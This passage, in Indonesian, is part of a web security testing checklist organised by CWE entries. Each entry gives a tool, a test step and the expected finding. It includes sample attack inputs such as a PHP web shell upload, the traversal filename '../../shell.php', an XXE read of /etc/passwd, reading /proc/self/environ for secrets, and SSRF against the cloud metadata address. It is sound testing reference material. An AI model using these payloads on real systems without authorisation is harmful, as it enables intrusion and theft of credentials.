  * **Verification**: File database SQLite memuat data sensitif tanpa enkripsi di disk.

- [ ] **CWE-316: Clear Text Storage of Sensitive Information in Memory**
  * **Tool**: Memory Dump Tool
  * **Pengujian**: Lakukan dump memori proses aplikasi saat user login.
  * **Verification**: Password user terbaca jelas dalam memory space.

- [ ] **CWE-419: Unprotected Primary Channel**
  * **Tool**: `nmap`
  * **Pengujian**: Scan ketersediaan enkripsi pada channel transmisi data primer.
  * **Verification**: Data dikirim melalui channel yang rentan disadap.

- [ ] **CWE-430: Deployment of Wrong Handler**
  * **Tool**: `curl`
  * **Pengujian**: Kirim ekstensi file yang tidak umum (seperti `.php.png`).
  * **Verification**: Web server mengeksekusi file tersebut sebagai script PHP alih-alih merendernya sebagai gambar.

- [ ] **CWE-434: Unrestricted Upload of File with Dangerous Type**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Upload web shell PHP (`.php`) melalui form upload gambar.
  * **Verification**: File ter-upload tanpa batasan tipe file dan dapat diakses publik untuk RCE.

- [ ] **CWE-444: HTTP Request Smuggling**
  * **Tool**: `Burp Suite` (HTTP Request Smuggler extension)
  * **Pengujian**: Kirim request dengan header ganda `Content-Length` dan `Transfer-Encoding: chunked`.
  * **Verification**: Frontend proxy dan backend server memproses batas request secara berbeda.

- [ ] **CWE-451: User Interface (UI) Misrepresentation of Critical Information**
  * **Tool**: Browser
  * **Pengujian**: Masukkan karakter unicode unik ke dalam URL redirect (Homograph attack).
  * **Verification**: Browser menampilkan nama domain palsu yang mirip dengan domain asli.

- [ ] **CWE-472: External Control of Assumed-Immutable Web Parameters**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Edit harga produk (`price=10000` menjadi `price=10`) sebelum mengirim form checkout.
  * **Verification**: Transaksi berhasil diproses menggunakan harga murah yang diubah client.

- [ ] **CWE-501: Trust Boundary Violation**
  * **Tool**: Review Source Code
  * **Pengujian**: Cek penyimpanan variabel session/cookie yang bisa di-inject langsung oleh client.
  * **Verification**: Server mempercayai data dari browser client tanpa validasi ulang di sisi server.

- [ ] **CWE-522: Insufficiently Protected Credentials**
  * **Tool**: `john`, `hashcat`
  * **Pengujian**: Crack hash database password menggunakan dictionary.
  * **Verification**: Hash mudah dipecahkan karena menggunakan fungsi enkripsi lemah tanpa salt/work-factor tinggi.

- [ ] **CWE-525: Use of Web Browser Cache Containing Sensitive Information**
  * **Tool**: Browser (Back Button Test)
  * **Pengujian**: Logout dari aplikasi, klik tombol 'Back' di browser.
  * **Verification**: Halaman privat tetap tampil dari cache browser tanpa autentikasi ulang.

- [ ] **CWE-539: Use of Persistent Cookies Containing Sensitive Information**
  * **Tool**: Browser Developer Tools
  * **Pengujian**: Periksa masa aktif cookie session (`Expires/Max-Age`).
  * **Verification**: Cookie session diatur aktif selamanya (persistent) meskipun browser ditutup.

- [ ] **CWE-579: J2EE Bad Practices: Non-serializable Object Stored in Session**
  * **Tool**: Java debugger / Source Review
  * **Pengujian**: Uji failover/clustering server penampung session.
  * **Verification**: Terjadi error replikasi session karena objek data tidak ter-serialisasi dengan benar.

- [ ] **CWE-598: Use of GET Request Method With Sensitive Query Strings**
  * **Tool**: Browser URL Bar / `curl`
  * **Pengujian**: Kirim form login menggunakan metode `GET` (`/login?user=admin&pass=admin123`).
  * **Verification**: Kredensial terekspos di history browser, file log web server, dan header referer.

- [ ] **CWE-602: Client-Side Enforcement of Server-Side Security**
  * **Tool**: `Burp Suite` (Bypass JavaScript validation)
  * **Pengujian**: Nonaktifkan JS di browser, lalu kirim input ilegal melalui form.
  * **Verification**: Server memproses input ilegal tersebut karena validasi hanya dipasang di sisi client.

- [ ] **CWE-642: External Control of Critical State Data**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Modifikasi session cookie yang memuat status login (seperti `logged_in=false` ke `logged_in=true`).
  * **Verification**: Otorisasi sukses didapatkan hanya dengan merubah data client.

- [ ] **CWE-646: Reliance on File Name or Extension of Externally-Supplied Files**
  * **Tool**: `curl`
  * **Pengujian**: Kirim request file upload dengan merubah header filename menjadi path traversal (`../../shell.php`).
  * **Verification**: Server menaruh file tersebut langsung di folder web root utama.

- [ ] **CWE-650: Trusting HTTP Permission Methods on the Server Side**
  * **Tool**: `curl`
  * **Pengujian**: Ganti HTTP request method dari `POST` (yang diblokir) menjadi `HEAD` atau `OPTIONS` untuk request yang sama.
  * **Verification**: Bypass filter akses firewall web.

- [ ] **CWE-653: Insufficient Compartmentalization**
  * **Tool**: Network Scanner
  * **Pengujian**: Eksploitasi satu service di server.
  * **Verification**: Mendapatkan hak akses penuh ke seluruh server lainnya karena tidak adanya pembatasan jaringan / sandboxing.

- [ ] **CWE-656: Reliance on Security Through Obscurity**
  * **Tool**: `gobuster`
  * **Pengujian**: Cari halaman administrasi yang hanya disembunyikan menggunakan nama path acak (seperti `/admin-192837.php`).
  * **Verification**: Siapa pun dapat mengakses panel admin jika berhasil menebak namanya.

- [ ] **CWE-657: Violation of Secure Design Principles**
  * **Tool**: Review Arsitektur
  * **Pengujian**: Cek apakah semua layer aplikasi memvalidasi hak akses.
  * **Verification**: Penyerang dapat langsung memanggil API level rendah tanpa melalui gateway otentikasi.

- [ ] **CWE-799: Improper Control of Interaction Frequency**
  * **Tool**: `ffuf` (Rate limiting test)
  * **Pengujian**: Jalankan brute force login dengan kecepatan tinggi (100 request/detik).
  * **Verification**: Server tidak memblokir IP kita atau meminta captcha (tidak ada rate-limiting).

- [ ] **CWE-807: Reliance on Untrusted Inputs in a Security Decision**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirim HTTP Header custom (seperti `X-Forwarded-For: 127.0.0.1`) untuk bypass proteksi IP.
  * **Verification**: Server menganggap request berasal dari localhost dan membuka akses administratif.

- [ ] **CWE-840: Business Logic Errors**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Lakukan alur belanja secara tidak wajar (misal: checkout keranjang belanja dengan nilai kuantitas negatif).
  * **Verification**: Nilai total belanja berkurang (mendapatkan diskon ilegal).

- [ ] **CWE-841: Improper Enforcement of Behavioral Workflow**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Akses langsung halaman langkah akhir (`/checkout/success`) tanpa melewati proses pembayaran.
  * **Verification**: Transaksi diselesaikan sebagai "berhasil" tanpa verifikasi pembayaran.

- [ ] **CWE-927: Use of Implicit Intent for Sensitive Communication**
  * **Tool**: Android Debug Bridge (ADB)
  * **Pengujian**: Kirim intent implicit yang memuat data token API di aplikasi Android.
  * **Verification**: Aplikasi lain di sistem dapat menangkap intent dan mencuri data token tersebut.

- [ ] **CWE-1021: Improper Restriction of Rendered UI Layers or Frames (Clickjacking)**
  * **Tool**: Custom HTML file
  * **Pengujian**: Load halaman target di dalam sebuah iframe (`<iframe src="https://target.com">`).
  * **Verification**: Halaman web berhasil dimuat dalam iframe (tidak memblokir dengan `X-Frame-Options` atau CSP `frame-ancestors`).

- [ ] **CWE-1173: Improper Use of Validation Framework**
  * **Tool**: Review Source Code
  * **Pengujian**: Periksa implementasi framework validasi backend.
  * **Verification**: Framework dikonfigurasi salah, menyebabkan beberapa input ilegal lolos ke pemrosesan logika utama.

---

### 5. Configuration & XML

- [ ] **CWE-2: Configuration (General)**
  * **Tool**: `nuclei`
  * **Pengujian**: Scan folder admin, file konfigurasi, console dev tool yang terbuka.
  * **Verification**: Menemukan setting default server yang tidak diamankan.

- [ ] **CWE-11: ASP.NET Misconfiguration: Creating Debug Binary**
  * **Tool**: `curl`
  * **Pengujian**: Cek apakah konfigurasi `debug="true"` aktif di file `web.config` ASP.NET.
  * **Verification**: Menampilkan stack trace error yang sangat detail saat error dipicu.

- [ ] **CWE-13: ASP.NET Misconfiguration: Password in Configuration File**
  * **Tool**: `curl`
  * **Pengujian**: Periksa apakah kredensial disimpan plain-text dalam file `web.config` yang terekspos.
  * **Verification**: Kredensial database bocor ke publik.

- [ ] **CWE-15: External Control of System or Configuration Settings**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirim request parameter yang merubah setelan runtime server secara dinamis.
  * **Verification**: Konfigurasi server berubah sesuai input eksternal.

- [ ] **CWE-16: Configuration (Misconfiguration)**
  * **Tool**: `nikto`, `nuclei`
  * **Pengujian**: Pindai seluruh web server untuk mendeteksi file default bawaan instalasi.
  * **Verification**: Menemukan portal default apache/nginx yang belum dihapus.

- [ ] **CWE-260: Password in Configuration File**
  * **Tool**: `grep`
  * **Pengujian**: Scan repository git untuk file `config.properties`, `settings.py`.
  * **Verification**: Password API key tertulis mentah dalam file.

- [ ] **CWE-315: Clear Text Storage of Sensitive Information in a Cookie**
  * **Tool**: Browser Developer Tools
  * **Pengujian**: Cek cookie data user setelah login.
  * **Verification**: Cookie memuat password plain-text atau data privilege (`role=admin`).

- [ ] **CWE-520: .NET Misconfiguration: Use of Information**
  * **Tool**: `nuclei`
  * **Pengujian**: Deteksi endpoint metadata .NET.
  * **Verification**: Eksposur detail struktur Class dan internal service.

- [ ] **CWE-526: Exposure of Sensitive Information Through Environmental Variables**
  * **Tool**: `payload_generator.py` (tipe `lfi` / `cmdi`)
  * **Pengujian**: Baca environment variables server (`printenv` atau membaca file `/proc/self/environ`).
  * **Verification**: Kunci rahasia env (seperti `AWS_SECRET_ACCESS_KEY`) terekspos.

- [ ] **CWE-537: Java Runtime Error Message Containing Sensitive Information**
  * **Tool**: `curl`
  * **Pengujian**: Force java server memicu error (`NullPointerException`).
  * **Verification**: Stack trace java mengungkap nama framework dan file path server.

- [ ] **CWE-541: Inclusion of Sensitive Information in an Include File**
  * **Tool**: `gobuster`
  * **Pengujian**: Enumerasi file include (seperti `.inc`, `.conf`).
  * **Verification**: Membuka langsung file include mengungkap source code koneksi database.

- [ ] **CWE-547: Use of Hard-coded, Security-relevant Constants**
  * **Tool**: Review Source Code
  * **Pengujian**: Periksa konstanta timeout sesi atau batas percobaan login.
  * **Verification**: Kunci sesi statis digunakan untuk memverifikasi autentikasi user.

- [ ] **CWE-611: Improper Restriction of XML External Entity Reference (XXE)**
  * **Tool**: `payload_generator.py` (tipe `xxe`)
  * **Pengujian**: Kirim XML request berisikan External Entity (`ENTITY xxe SYSTEM "file:///etc/passwd"`).
  * **Verification**: Server memproses entity dan mengembalikan isi file sistem internal di response.

- [ ] **CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute**
  * **Tool**: `curl`
  * **Pengujian**: Periksa cookie session untuk login HTTPS.
  * **Verification**: Cookie tidak memiliki flag `Secure` sehingga rentan dibajak lewat jaringan HTTP biasa.

- [ ] **CWE-756: Missing Custom Error Page**
  * **Tool**: `curl`
  * **Pengujian**: Akses halaman error `404` atau `500`.
  * **Verification**: Tampilan default web server (Tomcat, Apache, IIS) muncul lengkap dengan versi sistem operasi.

- [ ] **CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')**
  * **Tool**: `payload_generator.py` (tipe `xxe`)
  * **Pengujian**: Kirim file XML dengan entitas rekursif (XML Bomb / Billion Laughs attack).
  * **Verification**: Penggunaan memori server melonjak 100%, memicu Denial of Service (DoS).

- [ ] **CWE-942: Overly Permissive Cross-domain Whitelist (CORS Misconfig)**
  * **Tool**: `curl`
  * **Pengujian**: Kirim request dengan header `Origin: http://evil.com`.
  * **Verification**: Respons mengembalikan `Access-Control-Allow-Origin: http://evil.com` dan `Access-Control-Allow-Credentials: true`.

- [ ] **CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag**
  * **Tool**: `curl`
  * **Pengujian**: Cek HTTP response header `Set-Cookie` pada cookie session.
  * **Verification**: Flag `HttpOnly` absen, membuat session token rentan dicuri lewat serangan XSS.

- [ ] **CWE-1032: OWASP Top Ten 2017 Category A6 - Security Misconfiguration**
  * **Tool**: `nuclei`, `nikto`
  * **Pengujian**: Scan port administrasi terbuka secara publik (seperti kubernetes dashboard, adminer console).
  * **Verification**: Dashboard kontrol dapat diakses publik tanpa autentikasi.

- [ ] **CWE-1174: ASP.NET Misconfiguration: Improper Model Validation**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirim model data tidak lengkap ke aplikasi ASP.NET.
  * **Verification**: Model binding memproses request tanpa melalui framework validasi model utama.

---

### 6. Known Components

- [ ] **CWE-937: OWASP Top 10 2013: Using Components with Known Vulnerabilities**
  * **Tool**: `nuclei`, `whatweb`
  * **Pengujian**: Identifikasi versi CMS atau library (seperti WordPress 4.0, jQuery 1.8.2).
  * **Verification**: Versi komponen memiliki database kerentanan publik (CVE).

- [ ] **CWE-1035: 2017 Top 10 A9: Using Components with Known Vulnerabilities**
  * **Tool**: `nuclei`
  * **Pengujian**: Scan kerentanan CVE pada server backend.
  * **Verification**: Menemukan komponen web server (Apache/Nginx/PHP) yang rentan exploit RCE publik.

- [ ] **CWE-1104: Use of Unmaintained Third Party Components**
  * **Tool**: `whatweb`
  * **Pengujian**: Periksa library JavaScript yang di-load aplikasi.
  * **Verification**: Menggunakan library usang yang sudah tidak didevelop lagi dan memiliki bug keamanan terbuka.

---

### 7. Credentials & Weak Authentication

- [ ] **CWE-255: Credentials Management Errors**
  * **Tool**: `hydra`, `ffuf`
  * **Pengujian**: Pemindaian penggunaan kredensial default atau penanganan session login.
  * **Verification**: Kredensial ditangani tanpa proteksi memadai di backend.

- [ ] **CWE-259: Use of Hard-coded Password**
  * **Tool**: `grep`
  * **Pengujian**: Pengecekan file kode backend untuk pencarian string kredensial.
  * **Verification**: Password tertulis statis di level kode.

- [ ] **CWE-287: Improper Authentication**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirim parameter authentication kosong (null) ke API.
  * **Verification**: Server meloloskan autentikasi tanpa pengecekan kredensial.

- [ ] **CWE-288: Authentication Bypass Using an Alternate Path or Channel**
  * **Tool**: `gobuster`, `ffuf`
  * **Pengujian**: Cari halaman administrasi alternatif (seperti `/admin/login_bypass.php` atau API login `/api/v2/auth`).
  * **Verification**: Berhasil masuk dashboard tanpa melalui halaman login utama.

- [ ] **CWE-290: Authentication Bypass by Spoofing**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirim Header IP spoofing (`X-Client-IP: 127.0.0.1`).
  * **Verification**: Akses panel terbuka karena server percaya data palsu pada header.

- [ ] **CWE-294: Authentication Bypass by Capture-replay**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Tangkap request pengiriman OTP atau transaksi, lalu kirim ulang request yang sama setelah beberapa menit.
  * **Verification**: OTP atau transaksi yang sama berhasil diproses kembali (karena ketiadaan nonce / replay protection).

- [ ] **CWE-295: Improper Certificate Validation**
  * **Tool**: `curl`
  * **Pengujian**: Request API HTTPS menggunakan opsi `-k` (ignore SSL warnings) di curl.
  * **Verification**: Aplikasi backend menerima koneksi dari server luar dengan SSL invalid.

- [ ] **CWE-297: Improper Validation of Certificate with Host Mismatch**
  * **Tool**: `curl`
  * **Pengujian**: Cek apakah sertifikat SSL/TLS domain A dapat dipakai untuk domain B.
  * **Verification**: Server tidak memvalidasi ketidakcocokan domain pada sertifikat TLS.

- [ ] **CWE-300: Channel Accessible by Non-Endpoint (MITM)**
  * **Tool**: Wireshark, `tcpdump`
  * **Pengujian**: Analisis enkripsi transit data.
  * **Verification**: Kurangnya enkripsi data transit memungkinkan pihak ketiga memanipulasi paket data.

- [ ] **CWE-302: Authentication Bypass by Assumed-Immutable Data**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Ganti username pada cookie session (`user=admin`) yang tidak terenkripsi/tertandatangan.
  * **Verification**: Login berhasil beralih ke user lain hanya dengan merubah cookie.

- [ ] **CWE-304: Missing Critical Step in Authentication**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Lakukan login, bypass pengiriman kode 2FA dengan langsung menembak halaman dashboard.
  * **Verification**: Berhasil masuk ke dashboard meskipun langkah verifikasi 2FA dilewati.

- [ ] **CWE-306: Missing Authentication for Critical Function**
  * **Tool**: `curl`
  * **Pengujian**: Panggil langsung fungsi API penghapusan database (`POST /api/db/delete`) tanpa token autentikasi.
  * **Verification**: Penghapusan data tereksekusi tanpa otentikasi.

- [ ] **CWE-307: Improper Restriction of Excessive Authentication Attempts**
  * **Tool**: `hydra`, `ffuf`
  * **Pengujian**: Lakukan percobaan login salah 100 kali berturut-turut.
  * **Verification**: IP tidak diblokir dan tidak ada cooldown penahanan login (tidak ada rate-limiting).

- [ ] **CWE-346: Origin Validation Error**
  * **Tool**: `curl`
  * **Pengujian**: Kirim cross-origin request ke API endpoint privat.
  * **Verification**: Server memproses request dan mengembalikan data sensitif ke origin tidak sah.

- [ ] **CWE-384: Session Fixation**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Amati ID session sebelum dan sesudah login.
  * **Verification**: ID cookie session bernilai sama persis setelah login sukses dilakukan.

- [ ] **CWE-521: Weak Password Requirements**
  * **Tool**: Register form test
  * **Pengujian**: Lakukan registrasi menggunakan password sangat sederhana (`123456` atau `password`).
  * **Verification**: Registrasi disetujui tanpa warning password lemah.

- [ ] **CWE-613: Insufficient Session Expiration**
  * **Tool**: Browser Developer Tools
  * **Pengujian**: Lakukan login, diamkan session selama 24 jam tanpa aktivitas.
  * **Verification**: Cookie session tetap valid dan tidak kedaluwarsa secara otomatis.

- [ ] **CWE-620: Unverified Password Change**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Lakukan ganti password tanpa memasukkan password lama (current password).
  * **Verification**: Password berhasil diubah langsung.

- [ ] **CWE-640: Weak Password Recovery Mechanism for Forgotten Password**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Uji link reset password (apakah token reset dikirim lewat email bersifat pendek, atau hanya berisi ID user biasa).
  * **Verification**: Token reset dapat ditebak atau diprediksi secara matematis.

- [ ] **CWE-798: Use of Hard-coded Credentials**
  * **Tool**: `grep`, `nuclei`
  * **Pengujian**: Pindai source code dan file konfigurasi target.
  * **Verification**: Menemukan kredensial default tertulis permanen di level kode.

- [ ] **CWE-940: Improper Verification of Source of a Communication Channel**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Uji apakah server menerima update event dari webhook luar tanpa memvalidasi signature webhook.
  * **Verification**: Server memproses update transaksi palsu dari luar.

- [ ] **CWE-1216: Lockout Mechanism Errors**
  * **Tool**: `hydra`
  * **Pengujian**: Brute force target login untuk menguji akun terkunci.
  * **Verification**: Akun terkunci selamanya tanpa mekanisme unlock otomatis atau reset, memicu DoS lokal pada user sah.

---

### 8. Deserialization & Data Integrity

- [ ] **CWE-345: Insufficient Verification of Data Authenticity**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirim data terkompresi atau terenkripsi yang sudah dimodifikasi isinya.
  * **Verification**: Server memproses data rusak tanpa melakukan verifikasi integritas checksum.

- [ ] **CWE-353: Missing Support for Integrity Check**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Modifikasi parameter transaksi keuangan di client-side.
  * **Verification**: Transaksi berhasil diproses tanpa validasi tanda tangan hash di server.

- [ ] **CWE-426: Untrusted Search Path**
  * **Tool**: `terminal` (Local privilege escalation)
  * **Pengujian**: Buat file executable palsu di direktori publik (seperti `/tmp/`), manipulasi variable PATH sistem.
  * **Verification**: Sistem mengeksekusi file palsu kita ketika perintah utama dipanggil (RCE/LPE).

- [ ] **CWE-494: Download of Code Without Integrity Check**
  * **Tool**: `nmap`, Network interception
  * **Pengujian**: Cek apakah aplikasi mendownload update file binary melalui HTTP biasa.
  * **Verification**: binary file berhasil disisipi malware di tengah jalan (MITM).

- [ ] **CWE-502: Deserialization of Untrusted Data**
  * **Tool**: `ysoserial` (untuk Java), `Burp Suite`
  * **Pengujian**: Kirim objek serialisasi bahasa pemrograman (seperti payload Python pickle atau serialisasi Java) yang sudah dimodifikasi.
  * **Verification**: Aplikasi mengalami error crash atau mengeksekusi perintah di payload (RCE).

- [ ] **CWE-565: Reliance on Cookies without Validation and Integrity Checking**
  * **Tool**: Browser Developer Tools
  * **Pengujian**: Edit data user dalam cookie (seperti `username=admin`).
  * **Verification**: Sesi langsung berubah menjadi admin tanpa validasi signature cookie di server.

- [ ] **CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision**
  * **Tool**: Browser Developer Tools
  * **Pengujian**: Edit cookie level otorisasi di browser client.
  * **Verification**: Logika server langsung memberikan akses berdasarkan nilai cookie client yang dimodifikasi.

- [ ] **CWE-829: Inclusion of Functionality from Untrusted Control Sphere**
  * **Tool**: Browser Developer Tools
  * **Pengujian**: Cek apakah aplikasi me-load script JavaScript eksternal dari domain yang tidak terpercaya.
  * **Verification**: Domain eksternal tersebut diretas, menyusupkan script malware ke browser user target.

- [ ] **CWE-830: Inclusion of Web Functionality from an Untrusted Source**
  * **Tool**: Browser Developer Tools
  * **Pengujian**: Cek iframe atau component web dari pihak ketiga.
  * **Verification**: Komponen pihak ketiga disusupi kode jahat untuk mencuri kredensial.

- [ ] **CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes (Prototype Pollution)**
  * **Tool**: `Burp Suite`
  * **Pengujian**: Kirim payload JSON berisikan property `__proto__` (seperti `{"__proto__": {"isAdmin": true}}`).
  * **Verification**: Seluruh objek JS di runtime mewarisi properti baru tersebut, mengubah level akses user menjadi admin.

---

### 9. Logging & SSRF

- [ ] **CWE-117: Improper Output Neutralization for Logs (Log Injection)**
  * **Tool**: `curl`
  * **Pengujian**: Kirim parameter input berisikan karakter baris baru (`\n` atau `%0a`) diikuti baris log palsu.
  * **Verification**: File log admin menampilkan baris log baru palsu yang tampak sah (misal: `[INFO] Login successful for user admin`).

- [ ] **CWE-223: Omission of Security-relevant Information**
  * **Tool**: Review audit log
  * **Pengujian**: Lakukan aksi sensitif (seperti ganti password atau hapus user).
  * **Verification**: Log aktivitas keamanan tidak mencatat aksi tersebut.

- [ ] **CWE-532: Insertion of Sensitive Information into Log Files**
  * **Tool**: `terminal` (Membaca file `/var/log/`)
  * **Pengujian**: Lakukan penginputan password salah di form login.
  * **Verification**: Kredensial user ditulis secara plain-text dalam file log server (`app.log`).

- [ ] **CWE-778: Insufficient Logging**
  * **Tool**: Review audit log
  * **Pengujian**: Lakukan serangan brute-force login berulang kali.
  * **Verification**: Log server tidak mendeteksi atau mencatat lonjakan request gagal.

- [ ] **CWE-918: Server-Side Request Forgery (SSRF)**
  * **Tool**: `payload_generator.py` (tipe `ssrf`), `curl`
  * **Pengujian**: Fuzzing parameter dengan URL local metadata (`http://169.254.169.254/`).
  * **Verification**: Server merespons dengan mengembalikan data internal cloud provider.
